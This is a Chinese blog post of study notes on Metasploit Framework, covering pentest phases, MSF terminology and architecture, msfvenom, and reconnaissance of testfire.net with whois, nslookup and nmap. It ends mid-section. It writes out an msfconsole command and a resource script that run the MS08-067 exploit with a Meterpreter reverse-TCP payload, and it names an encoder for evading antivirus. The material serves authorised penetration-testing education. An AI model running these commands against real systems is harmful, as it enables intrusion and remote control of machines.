<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cs-cshi.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="Metasploit Framework">
<meta property="og:type" content="article">
<meta property="og:title" content="Metasploit Framework">
<meta property="og:url" content="https://cs-cshi.github.io/cybersecurity/Metasploit%20Framework/index.html">
<meta property="og:site_name" content="Chang">
<meta property="og:description" content="Metasploit Framework">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/MSF/netcraft_example1.png">
<meta property="article:published_time" content="2021-06-05T01:00:00.000Z">
<meta property="article:modified_time" content="2021-07-05T01:03:06.667Z">
<meta property="article:author" content="Charles">
<meta property="article:tag" content="工具">
<meta property="article:tag" content="网络安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/MSF/netcraft_example1.png">

<link rel="canonical" href="https://cs-cshi.github.io/cybersecurity/Metasploit%20Framework/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Metasploit Framework | Chang</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Chang</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页 | home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于 | about</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签 | tags<span class="badge">14</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类 | categories<span class="badge">25</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档 | archives<span class="badge">44</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索 | search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cs-cshi.github.io/cybersecurity/Metasploit%20Framework/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Charles">
      <meta itemprop="description" content="慢下来，记录生活点滴，畅游人类知识和艺术的海洋。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chang">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Metasploit Framework
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-05 09:00:00" itemprop="dateCreated datePublished" datetime="2021-06-05T09:00:00+08:00">2021-06-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-05 09:03:06" itemprop="dateModified" datetime="2021-07-05T09:03:06+08:00">2021-07-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/cybersecurity/Metasploit%20Framework/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/cybersecurity/Metasploit%20Framework/" itemprop="commentCount"></span>
    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>30k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>27 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>Metasploit Framework</p>
<span id="more"></span>
<h1 id="0-渗透测试基础"><a href="#0-渗透测试基础" class="headerlink" title="0. 渗透测试基础"></a>0. 渗透测试基础</h1><h2 id="0-1-PTES-中渗透测试阶段"><a href="#0-1-PTES-中渗透测试阶段" class="headerlink" title="0.1 PTES 中渗透测试阶段"></a>0.1 PTES 中渗透测试阶段</h2><ol>
<li><p>前期交互阶段<br>通常与客户组织讨论，确定<strong>渗透测试的范围和目标</strong>，走出全范围渗透测试的理想化愿景。</p>
</li>
<li><p>情报搜集阶段<br>采用各种方法搜集将要攻击的客户组织的所有信息，确定在目标系统中实施了哪些安全防护机制。</p>
</li>
<li><p>威胁建模阶段<br>使用情报搜集阶段所获取的信息，标识出目标系统可能存在的安全漏洞和弱点，确定最为有效的攻击方法。</p>
</li>
<li><p>漏洞分析阶段<br>一旦确定最为可行的攻击方法后，考虑如何获取目标系统的访问权，并综合前面几个环节获得的信息，分析哪些攻击途径可行。</p>
</li>
<li><p>渗透攻击阶段<br>最好在基本能确信特定渗透攻击能成功的基础上，才真正展开渗透攻击。进行漫无目的的渗透尝试后期待一个奇迹般的 shell 是痴心妄想。</p>
</li>
<li><p>后渗透攻击阶段<br>从已经攻陷客户组织的一些系统或管理权限之后开始。<br>以特定的系统为目标，识别出关键的基础设施，并寻找客户组织最具价值和尝试进行安全保护的信息和资产，演示出能够对客户组织造成最重要业务影响的攻击途径。</p>
</li>
<li><p>报告阶段<br>使用报告文档来说明做了工作，如何做的，以及如何修复发展的漏洞与弱点。<br>至少包含摘要、过程展示和技术发现这几个部分。</p>
</li>
</ol>
<h2 id="0-2-渗透测试类型"><a href="#0-2-渗透测试类型" class="headerlink" title="0.2 渗透测试类型"></a>0.2 渗透测试类型</h2><ol>
<li><p>白盒测试<br>拥有所有客户组织系统与网络环境的内部知识，可以在不需要害怕被阻断的情况下实施攻击。<br>白盒测试最大问题在于无法有效地测试客户组织的应急响应程序，无法判断出他们的安全防护计划检测特定攻击的效率。</p>
</li>
<li><p>黑盒测试<br>经由授权的黑河测试时设计成为模拟攻击者的入侵行为，在不了解客户组织大部分信息和知识的情况下实施的。<br>黑盒测试可以用来测试内部安全团队检测和应对一次攻击的能力。</p>
</li>
<li><p>灰盒测试<br>白盒测试和黑盒测试的组合。<br>即便拥有明确的目标和访问凭证，也会对目标进行信息搜集以获取尽可能多的信息，尝试在无访问凭证下获取弱点。</p>
</li>
</ol>
<h1 id="1-Metasploit-Framework"><a href="#1-Metasploit-Framework" class="headerlink" title="1. Metasploit Framework"></a>1. Metasploit Framework</h1><blockquote>
<ul>
<li>MSF 默认集成于 kali linux 之中</li>
<li>使用 postgresql 数据库存储数据</li>
</ul>
</blockquote>
<h2 id="1-1-专业术语"><a href="#1-1-专业术语" class="headerlink" title="1.1 专业术语"></a>1.1 专业术语</h2><h3 id="1-1-1-渗透攻击-exploit"><a href="#1-1-1-渗透攻击-exploit" class="headerlink" title="1.1.1 渗透攻击(exploit)"></a>1.1.1 渗透攻击(exploit)</h3><p>  攻击者利用一个系统、应用或者服务中的安全漏洞，所进行的攻击行为。常见渗透攻击技术：缓冲区溢出、Web应用程序漏洞攻击（如 SQL 注入），及利用配置错误。</p>
<h3 id="1-1-2-攻击载荷-payload"><a href="#1-1-2-攻击载荷-payload" class="headerlink" title="1.1.2 攻击载荷(payload)"></a>1.1.2 攻击载荷(payload)</h3><p>  目标系统被渗透攻击之后执行的代码。例如 反弹shell 是一种从目标主机到攻击主机创建网络连接，并提供 Windows 命令行 shell 的攻击载荷，而 bindshell 攻击载荷是在目标主机上将命令行 shell 绑定到一个打开的监听端口上，攻击者可以连接这些端口来取得 shell 交互。</p>
<h3 id="1-1-3-shellcode"><a href="#1-1-3-shellcode" class="headerlink" title="1.1.3 shellcode"></a>1.1.3 shellcode</h3><p>  shellcode 是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode 通常以汇编语言编写。大多数情况下，目标系统执行了 shellcode 这组指令后，才会提供一个命令行 shell 或 Meterpreter shell。</p>
<h3 id="1-1-4-模块-module"><a href="#1-1-4-模块-module" class="headerlink" title="1.1.4 模块(module)"></a>1.1.4 模块(module)</h3><p>  Metasploit 中一个模块指 Metasploit 框架中所使用的一段软件代码组件。如 Metasploit 中渗透攻击模块（exploit module）、辅助模块（auxiliary module）。</p>
<h3 id="1-1-5-监听器（Listener）"><a href="#1-1-5-监听器（Listener）" class="headerlink" title="1.1.5 监听器（Listener）"></a>1.1.5 监听器（Listener）</h3><p>  Metasploit 中监听器是用来等待连入网络连接的组件。如目标主机被渗透攻击后回连攻击主机主机上，监听器组件可以在攻击主机上等待这类系统来连接，并处理这些网络连接。</p>
<h2 id="1-2-Metasploit-用户接口"><a href="#1-2-Metasploit-用户接口" class="headerlink" title="1.2 Metasploit 用户接口"></a>1.2 Metasploit 用户接口</h2><h3 id="1-2-1-MSF-终端"><a href="#1-2-1-MSF-终端" class="headerlink" title="1.2.1 MSF 终端"></a>1.2.1 MSF 终端</h3><blockquote>
<p>不区分大小写<br>MSF 终端（msfconsole）是目前 Metasploit 框架最为流行的用户接口。</p>
<ul>
<li>最流行的用户接口</li>
<li>几乎可以使用 MSF 全部功能</li>
<li>支持外部命令的执行</li>
</ul>
</blockquote>
<ul>
<li>启动方式<ol>
<li>点击 msf 图标</li>
<li>终端命令：<code>msfconsole</code> </li>
</ol>
</li>
</ul>
<p>访问 MSF 终端的帮助文档，只需要敲入 help，并加上感兴趣的 metasploit 命令</p>
<blockquote>
<ul>
<li>help</li>
<li>help vulns</li>
<li>msfconsole -h</li>
</ul>
</blockquote>
<h3 id="1-2-2-MSF-命令行"><a href="#1-2-2-MSF-命令行" class="headerlink" title="1.2.2 MSF 命令行"></a>1.2.2 MSF 命令行</h3><p>Metasploit 早期版本中，msfcli 命令行工具和 MSF 终端为 Metasploit 框架访问的两种截然不同的方式。<br>MSF 终端以一种给用户友好的方式来提供交互，msfcli 主要考虑对脚本处理和与其他命令行工具的互操作性。</p>
<p>msfcli 可以直接从命令行 shell 执行，并允许将其他工具的输出重定向至 msfcli 中，以及将 msfcli 输出重定向至其他命令行工具。</p>
<p>2015 年 1 月开始官方不再支持 msfcli 命令行，建议使用 MSF 终端的 ‘-x’ 选项替代。</p>
<p>比如进行 MS08-067 漏洞的渗透利用，可以采用如下命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run&quot;</span><br></pre></td></tr></table></figure>

<p>还可以充分利用 MSF 终端提供的资源脚本和命令化名（alias）等特性，编写自动化运行脚本 reverse_tcp.rc：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">set RHOST [IP]</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST [IP]</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>然后使用 MSF 终端 ‘-r’ 选项执行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfconsole -r /scripts_path/reverse_tcp.rc</span><br></pre></td></tr></table></figure>

<h3 id="1-2-3-Armitage"><a href="#1-2-3-Armitage" class="headerlink" title="1.2.3 Armitage"></a>1.2.3 Armitage</h3><p>一个完全交互式的图形化用户接口。</p>
<h2 id="1-3-Metasploit-功能程序"><a href="#1-3-Metasploit-功能程序" class="headerlink" title="1.3 Metasploit 功能程序"></a>1.3 Metasploit 功能程序</h2><p>Metasploit 功能程序是在某些特定场合下，对 Metasploit 框架中的一些特殊功能进行直接访问的接口。</p>
<h3 id="1-3-1-MSF-攻击载荷生成器"><a href="#1-3-1-MSF-攻击载荷生成器" class="headerlink" title="1.3.1 MSF 攻击载荷生成器"></a>1.3.1 MSF 攻击载荷生成器</h3><p>攻击载荷生成器能允许生成 shellcode、可执行代码和其他类型东西，也可以让他们在框架之外的渗透代码中使用。</p>
<p>shellcode 可以生成包括 C、Javascript 等多种格式，每种输出格式在不同的场景中使用。如编写浏览器渗透代码，以 Javascript 语言方式输出的 shellcode 最合适。</p>
<p>Metasploit 早期版本提供了单独的 msfpayload 功能程序来进行 MSF 攻击载荷生成，在 2015 年后 msfpayload 已被弃用，使用集成攻击载荷生成和编码的 msfvenom 功能程序替代。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~\# msfvenom -h</span><br></pre></td></tr></table></figure>
<p>如果想了解攻击模块的配置选项，采用 payload-options 可以列出所必须和可选的选项列表：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~\# msfvenom -p wondows/shell_reverse_tcp --payload-options</span><br></pre></td></tr></table></figure>

<h3 id="1-3-2-MSF-编码器"><a href="#1-3-2-MSF-编码器" class="headerlink" title="1.3.2 MSF 编码器"></a>1.3.2 MSF 编码器</h3><p>通过对原始攻击载荷进行编码的方式，来避免坏字符，以及逃避杀毒软件和 IDS 的检测。</p>
<p>Metasploit 中唯一一个具有 Excellent 等级的编码器：x86/shikata_ga_nai</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看可以的编码器及等级</span></span><br><span class="line">msfvenom -l encoders</span><br></pre></td></tr></table></figure>

<h3 id="1-3-3-Nasm-shell"><a href="#1-3-3-Nasm-shell" class="headerlink" title="1.3.3 Nasm shell"></a>1.3.3 Nasm shell</h3><p>Nasm_shell.rb 功能程序是了解汇编代码含义非常有用的工具。</p>
<h1 id="2-MSF-架构"><a href="#2-MSF-架构" class="headerlink" title="2. MSF 架构"></a>2. MSF 架构</h1><blockquote>
<p>/usr/share/metasploit-framework</p>
</blockquote>
<ul>
<li>Rex<ul>
<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
<li>处理 socket 连接访问、协议应答（http/SSL/SMB等）</li>
<li>编码转换（XOR、Base64、Unicode）</li>
</ul>
</li>
<li>Msf::Core<ul>
<li>提供 Msf 的核心基本API，是框架的核心能力实现库</li>
</ul>
</li>
<li>Msf::Base<ul>
<li>提供友好的 API 接口，便于模块调用的库</li>
</ul>
</li>
<li>Plugin 插件<ul>
<li>连接和调用外部扩展功能的系统</li>
</ul>
</li>
<li>Penetration Modules(<code>/usr/share/metasploit-framework/modules/</code>)<ul>
<li>Exploits：利用系统漏洞进行攻击的动作（方法），此模块对应每一个具体漏洞的攻击方式（攻击流程）</li>
<li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul>
<li>singles：所有功能都放在一起的 payload，比较大</li>
<li>stagers：目标机内存有限，先传输较小的 payload 用于建立连接</li>
<li>stages：利用 stagers 建立的连接下载的后续 payload</li>
</ul>
<blockquote>
<p>shellcode，获得目标机上执行 shell 的能力（正向/反向）</p>
</blockquote>
</li>
<li>auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）（DoS）</li>
<li>encoders：对 payload 进行加密，躲避 AV 检查的模块</li>
<li>nops：提高 payload 稳定性及维持大小</li>
<li>post</li>
</ul>
</li>
</ul>
<h1 id="3-情报搜集"><a href="#3-情报搜集" class="headerlink" title="3. 情报搜集"></a>3. 情报搜集</h1><p>情报搜集的目的是获取渗透目标的准确信息。</p>
<p>没必要对搜集的信息设定限制，即使最初看起来毫无价值的数据，可能在后续工作中有用。</p>
<p>详细的记录是决定一次渗透测试成败的关键点。</p>
<h2 id="3-1-被动信息搜集"><a href="#3-1-被动信息搜集" class="headerlink" title="3.1 被动信息搜集"></a>3.1 被动信息搜集</h2><p>在不接触到目标系统的情况下挖掘目标信息。</p>
<h3 id="3-1-1-whois-查询"><a href="#3-1-1-whois-查询" class="headerlink" title="3.1.1 whois 查询"></a>3.1.1 whois 查询</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> whois testfire.net</span></span><br><span class="line"></span><br><span class="line">   Domain Name: TESTFIRE.NET</span><br><span class="line">   Registry Domain ID: 8363973_DOMAIN_NET-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.corporatedomains.com</span><br><span class="line">   Registrar URL: http://cscdbs.com</span><br><span class="line">   Updated Date: 2020-07-19T05:07:07Z</span><br><span class="line">   Creation Date: 1999-07-23T13:52:32Z</span><br><span class="line">   Registry Expiry Date: 2021-07-23T13:52:32Z</span><br><span class="line">   Registrar: CSC Corporate Domains, Inc.</span><br><span class="line">   Registrar IANA ID: 299</span><br><span class="line">   Registrar Abuse Contact Email: domainabuse@cscglobal.com</span><br><span class="line">   Registrar Abuse Contact Phone: 8887802723</span><br><span class="line">   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited</span><br><span class="line">   Name Server: ASIA3.AKAM.NET</span><br><span class="line">   Name Server: EUR2.AKAM.NET</span><br><span class="line">   Name Server: EUR5.AKAM.NET</span><br><span class="line">   Name Server: NS1-206.AKAM.NET</span><br><span class="line">   Name Server: NS1-99.AKAM.NET</span><br><span class="line">   Name Server: USC2.AKAM.NET</span><br><span class="line">   Name Server: USC3.AKAM.NET</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
<p>发现域名服务器由 AKAM.NET 提供，这是关于不能攻击未授权系统的典型案例。</p>
<p>使用 DNS 服务器的区域传送攻击以及其他类似的攻击，通常能获得一个网络内部及外部很多信息。</p>
<h3 id="3-1-2-Netcraft"><a href="#3-1-2-Netcraft" class="headerlink" title="3.1.2 Netcraft"></a>3.1.2 Netcraft</h3><p>Netcraft（<a target="_blank" rel="noopener" href="https://sitereport.netcraft.com/%EF%BC%89%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%95%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%AE%83%E8%83%BD%E5%8F%91%E7%8E%B0%E6%89%BF%E8%BD%BD%E6%9F%90%E4%B8%AA%E7%89%B9%E5%AE%9A%E7%BD%91%E7%AB%99%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8IP%E5%9C%B0%E5%9D%80%E3%80%82">https://sitereport.netcraft.com/）是一个网页界面的工具，使用它能发现承载某个特定网站的服务器IP地址。</a><br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/MSF/netcraft_example1.png"><br>查明 testfire.net 的 IP 地址是 65.61.137.117 后，可以再做一次针对这个 IP 的 whois 查询。</p>
<blockquote>
<p>$ whois 65.61.137.117<br>connect: Network is unreachable<br>whois 使用的 Whois 协议，可能无法代理</p>
</blockquote>
<h3 id="3-1-3-nslookup"><a href="#3-1-3-nslookup" class="headerlink" title="3.1.3 nslookup"></a>3.1.3 nslookup</h3><p>利用 nslookup 来挖掘更多信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nslookup</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> <span class="built_in">type</span>=mx</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> testfire.net</span></span><br><span class="line"></span><br><span class="line">Server:         10.0.0.1</span><br><span class="line">Address:        10.0.0.1#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">*** Can&#x27;t find testfire.net: No answer</span><br><span class="line"></span><br><span class="line">Authoritative answers can be found from:</span><br><span class="line">testfire.net</span><br><span class="line">        origin = asia3.akam.net</span><br><span class="line">        mail addr = hostmaster.akamai.com</span><br><span class="line">        serial = 1366025606</span><br><span class="line">        refresh = 43200</span><br><span class="line">        retry = 7200</span><br><span class="line">        expire = 604800</span><br><span class="line">        minimum = 86400</span><br></pre></td></tr></table></figure>
<p>从中可以看出邮件服务器的 DNS 记录指向 hostmaster.akamai.com，显然是第三方运维。</p>
<h3 id="3-1-4-Google-Hacking"><a href="#3-1-4-Google-Hacking" class="headerlink" title="3.1.4 Google Hacking"></a>3.1.4 Google Hacking</h3><p>依赖搜索引擎被动搜集目标站点信息的技术成为Google Hacking</p>
<p>对于 testfire.net 网站，可以用过 google 搜索引擎提供的搜索关键字 site 来将搜索目标限定在这一网站域名下<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/387701">testfire.net 网站渗透记录</a></p>
<h2 id="3-2-主动信息收集"><a href="#3-2-主动信息收集" class="headerlink" title="3.2 主动信息收集"></a>3.2 主动信息收集</h2><h3 id="3-2-1-使用-nmap-进行端口扫描"><a href="#3-2-1-使用-nmap-进行端口扫描" class="headerlink" title="3.2.1 使用 nmap 进行端口扫描"></a>3.2.1 使用 nmap 进行端口扫描</h3><p>nmap 是最为流行的端口扫描工具，它集成在 Metasploit 中</p>
<ul>
<li>参数介绍<ul>
<li>-sS  执行一次隐蔽的 TCP 扫描，默认此方式</li>
<li>-sU  隐蔽的 UDP 扫描</li>
<li>-Pn  不要使用 ping 命令预先判断主机是否存活，默认所有主机是存活状态</li>
<li>-A  尝试进行服务枚举和旗标获取，去版本 version</li>
<li>-oN/-oX/-oS/-oG <file>  将normal、XML、s |&lt;rIpt kIddi3和greable格式的扫描输出到给定的文件名。</li>
<li>-oA  同时输出三种主要格式</li>
</ul>
</li>
</ul>
<h3 id="3-2-2-在-Metasploit-中使用数据库"><a href="#3-2-2-在-Metasploit-中使用数据库" class="headerlink" title="3.2.2 在 Metasploit 中使用数据库"></a>3.2.2 在 Metasploit 中使用数据库</h3><p>Metasploit 支持 MySQL、PostgreSQL、SQLite3 数据库，默认 PostgreSQL。</p>
<p>msfconsole 内输入 <code>db_</code> 再按 tab 能显示 msf 中 db 相关的命令：</p>
<blockquote>
<p>db_connect        db_export         db_nmap           db_remove         db_status<br>db_disconnect     db_import         db_rebuild_cache  db_save </p>
</blockquote>
<p>启动数据库：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 两种方式都可以</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> /etc/init.d/postgresql start</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> service postgresql start</span></span><br><span class="line">msf &gt; msfdb start  # 启动 msfdb，若 db 服务没开则启动无效</span><br><span class="line">msf &gt; msfdb reinit  # db 初始化</span><br></pre></td></tr></table></figure>

<h4 id="1-将-nmap-输入的结果导入-metasploit"><a href="#1-将-nmap-输入的结果导入-metasploit" class="headerlink" title="1. 将 nmap 输入的结果导入 metasploit"></a>1. 将 nmap 输入的结果导入 metasploit</h4><p>nmap -oX 参数可以将结果输出生 XML 格式文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap =Pn -sS -A -oX Subnet1.xml 192.168.1.0/24</span></span><br></pre></td></tr></table></figure>
<p>XML 文件生成后，使用 msf <code>db_import</code>命令将文件导入到数据库中，然后使用 msf <code>hosts</code>命令查看结果, <code>hosts</code>：显示数据库中所有已保存的主机信息</p>
<h4 id="2-高级-nmap-扫描技巧：TCP-空闲扫描"><a href="#2-高级-nmap-扫描技巧：TCP-空闲扫描" class="headerlink" title="2. 高级 nmap 扫描技巧：TCP 空闲扫描"></a>2. 高级 nmap 扫描技巧：TCP 空闲扫描</h4><p>这种扫描能冒充另一台主机 IP，对目标进行更隐秘的扫描。</p>
<p>先要定位一台使用递增 IP 帧标识机制的空闲主机</p>
<blockquote>
<ul>
<li>IP 帧标识（IP ID）：用于跟踪 IP 包的次序的一种技术</li>
<li>空闲主机：该主机特定时间内不向网络发送数据包</li>
</ul>
</blockquote>
<p>可以使用 Metasploit 的 <code>scanner/ip/ipidseq</code> 模块来寻找满足 TCP 空闲扫描要求的空闲主机:</p>
